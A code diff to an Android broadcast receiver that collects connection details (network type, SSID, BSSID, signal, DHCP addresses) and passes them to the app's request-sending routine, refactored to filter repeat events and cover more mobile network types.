@@ -28,6 +28,7 @@ import android.util.Log;
 import com.inet.android.certificate.R;
 import com.inet.android.db.OperationWithRecordInDataBase;
 import com.inet.android.request.RequestList;
+import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 
 public class NetworkChangeReceiver extends BroadcastReceiver {
@@ -40,7 +41,7 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 	String sendStr = "";
 	Resources path;
 	Context mContext;
-
+	private static String lastEvent = "";
 	public static final String LOG_TAG = NetworkChangeReceiver.class
 			.getSimpleName().toString();
 
@@ -50,51 +51,55 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 		sendStr = "";
 
 		if (ConnectivityManager.CONNECTIVITY_ACTION.equals(intent.getAction())) {
-			Log.d(this.getClass().getSimpleName(), "CONNECTIVITY_ACTION");
+			Logging.doLog(LOG_TAG, "CONNECTIVITY_ACTION", "CONNECTIVITY_ACTION");
 			path = mContext.getApplicationContext().getResources();
-			ConnectivityManager conMan = (ConnectivityManager) mContext
-					.getSystemService(Context.CONNECTIVITY_SERVICE);
-			NetworkInfo info = conMan.getActiveNetworkInfo();
-//			NetworkInfo info = intent
-//					.getParcelableExtra(ConnectivityManager.EXTRA_NETWORK_INFO);
+			// ConnectivityManager conMan = (ConnectivityManager) mContext
+			// .getSystemService(Context.CONNECTIVITY_SERVICE);
+			// NetworkInfo info = conMan.getActiveNetworkInfo();
+			NetworkInfo info = intent
+					.getParcelableExtra(ConnectivityManager.EXTRA_NETWORK_INFO);
 
 			if (info != null) {
-				if (NetworkInfo.State.CONNECTED == info.getState()) {
-					Logging.doLog(LOG_TAG, info.getState().toString(), info
-							.getState().toString());
-
-					if (info.getType() == ConnectivityManager.TYPE_WIFI)
+				Logging.doLog(LOG_TAG,
+						info.getState().toString() + " " + info.getType(), info
+								.getState().toString() + " " + info.getType());
+				if (NetworkInfo.State.CONNECTED == info.getState()
+						&& !lastEvent.equals(ConvertDate.logTime())) {
+					lastEvent = ConvertDate.logTime();
+					if (info.getType() == ConnectivityManager.TYPE_WIFI) {
 						if (info.isConnected())
 							getWifiState(info);
-						else if (info.getType() == ConnectivityManager.TYPE_MOBILE) {
-							sendStr += path.getString(R.string.connect_type)
-									+ info.getTypeName() + "\n" + " "
-									+ getMobileInfo(info.getSubtype()) + "\n"
-									+ path.getString(R.string.state) + ": "
-									+ info.getState() + "\n"
-									+ path.getString(R.string.detailed_state)
-									+ ": " + info.getDetailedState().name()
-									+ "\n" + "Info: " + info.getExtraInfo()
-									+ "\n" + "IP address: "
-									+ GetLocalIpAddress();
-							sendCreateService(sendStr);
-						} else {
+					} else if (info.getType() == ConnectivityManager.TYPE_MOBILE
+							|| info.getType() == ConnectivityManager.TYPE_MOBILE_DUN
+							|| info.getType() == ConnectivityManager.TYPE_MOBILE_HIPRI
+							|| info.getType() == ConnectivityManager.TYPE_MOBILE_MMS
+							|| info.getType() == ConnectivityManager.TYPE_MOBILE_SUPL) {
+						sendStr += path.getString(R.string.connect_type) + ": "
+								+ info.getTypeName() + "\n" + " "
+								+ getMobileInfo(info.getSubtype()) + "\n"
+								+ path.getString(R.string.state) + ": "
+								+ info.getState() + "\n"
+								+ path.getString(R.string.detailed_state)
+								+ ": " + info.getDetailedState().name() + "\n"
+								+ "Info: " + info.getExtraInfo() + "\n"
+								+ "IP address: " + GetLocalIpAddress();
+						sendCreateService(sendStr);
+					} else {
 
-							sendStr += path.getString(R.string.connect_type)
-									+ info.getTypeName() + "\n"
-									+ path.getString(R.string.connect_type)
-									+ info.getType() + "\n"
-									+ path.getString(R.string.subtype_name)
-									+ info.getSubtypeName() + "\n"
-									+ path.getString(R.string.state) + ": "
-									+ info.getState() + "\n" + " Info: "
-									+ info.getExtraInfo() + "\n";
-							sendCreateService(sendStr);
+						sendStr += path.getString(R.string.connect_type) + ": "
+								+ info.getTypeName() + "\n"
+								+ path.getString(R.string.subtype_name) + ": "
+								+ info.getSubtypeName() + "\n"
+								+ path.getString(R.string.state) + ": "
+								+ info.getState() + "\n" + "Info: "
+								+ info.getExtraInfo() + "\n";
+						sendCreateService(sendStr);
 
-						}
+					}
 				} else if (NetworkInfo.State.DISCONNECTING == info.getState()) {
 
-					Logging.doLog(LOG_TAG, "State.DISCONNECTING",
+					Logging.doLog(LOG_TAG,
+							"State.DISCONNECTING or retry event",
 							"State.DISCONNECTING");
 				}
 				OperationWithRecordInDataBase.sendRecord(mContext);
@@ -163,18 +168,9 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 		Log.d(LOG_TAG, myWifiInfo.getMacAddress());
 
 		if (info.isConnected()) {
-			int myIp = myWifiInfo.getIpAddress();
 
 			Log.d(LOG_TAG, "--- CONNECTED ---");
 
-			int intMyIp3 = myIp / 0x1000000;
-			int intMyIp3mod = myIp % 0x1000000;
-
-			int intMyIp2 = intMyIp3mod / 0x10000;
-			int intMyIp2mod = intMyIp3mod % 0x10000;
-
-			int intMyIp1 = intMyIp2mod / 0x100;
-			int intMyIp0 = intMyIp2mod % 0x100;
 			WifiManager wifii = (WifiManager) mContext.getApplicationContext()
 					.getSystemService(Context.WIFI_SERVICE);
 			DhcpInfo dhcp = wifii.getDhcpInfo();
@@ -193,21 +189,19 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 			String serverAddress = "Server IP: "
 					+ intToIpAddress(dhcp.serverAddress) + "\n";
 
-			sendStr += info.getTypeName() + "\n"
+			sendStr += path.getString(R.string.connect_type) + ": "
+					+ info.getTypeName() + "\n"
 					+ path.getString(R.string.state) + ": " + info.getState()
-					+ "\n" + "IP Address: " + String.valueOf(intMyIp0) + "."
-					+ String.valueOf(intMyIp1) + "." + String.valueOf(intMyIp2)
-					+ "." + String.valueOf(intMyIp3) + "\n"
-					+ path.getString(R.string.name_wifi_network) + ": "
+					+ "\n" + path.getString(R.string.name_wifi_network) + ": "
 					+ myWifiInfo.getSSID() + "\n"
 					+ path.getString(R.string.mac_address_point) + ": "
 					+ myWifiInfo.getBSSID() + "\n"
 					+ path.getString(R.string.speed) + ": "
 					+ String.valueOf(myWifiInfo.getLinkSpeed()) + " "
 					+ WifiInfo.LINK_SPEED_UNITS + "\n" + "RSRP: "
-					+ String.valueOf(myWifiInfo.getRssi()) + " dBm" + ipAddress
-					+ " " + netmask + " " + serverAddress + " " + dns1 + " "
-					+ dns2 + " " + gateway + " " + leaseDuration;
+					+ String.valueOf(myWifiInfo.getRssi()) + " dBm" + "\n"
+					+ ipAddress + " " + netmask + " " + serverAddress + " "
+					+ dns1 + " " + dns2 + " " + gateway + " " + leaseDuration;
 			Log.d(LOG_TAG, sendStr);
 
 		} else {
@@ -269,6 +263,7 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 	}
 
 	private void sendCreateService(String sendStr) {
+
 		RequestList.sendDataRequest(path.getString(R.string.network), sendStr,
 				mContext);
 
